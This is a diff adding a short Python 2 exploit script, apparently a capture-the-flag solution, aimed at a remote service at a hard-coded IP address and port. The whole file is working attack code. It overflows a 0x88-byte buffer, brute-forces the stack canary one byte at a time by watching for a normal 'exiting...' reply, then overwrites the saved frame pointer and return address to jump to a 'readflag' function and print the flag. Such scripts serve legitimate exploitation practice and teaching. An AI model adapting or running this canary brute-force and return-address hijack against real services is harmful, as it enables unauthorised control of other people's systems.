@@ -1,0 +1,41 @@
+from socket import *
+from time import sleep
+from select import select
+import struct
+import sys
+
+def le(addr):
+    return struct.pack('<Q', addr)
+
+def leB(addr):
+    return struct.pack('B', addr)
+
+
+buf = "A" * 0x88
+#buf += '\x00\x03\x44\xbf\x33\x94\x74\x19' # canary
+#buf += '\x00' * 8 # ebp
+#buf += '\x26\x0c\x40\x00\x00\x00\x00\x00' # ret addr
+
+
+# canary
+for i in range(8):
+    byte = 0
+    while 1:
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect_ex(("143.248.38.212", 40007))
+        s.send(buf + leB(byte))
+        # if exit normally
+        if 'exiting...' in s.recv(10000):
+            buf += leB(byte)
+            print hex(byte)
+            break
+        s.close()
+        byte = (byte + 1) % 255
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect_ex(("143.248.38.212", 40007))
+# ebp, and ret to readflag
+s.send(buf + '\0'*8 + le(0x400c26))
+s.recv(10000) # echoed string
+print s.recv(10000) # This is flag
+
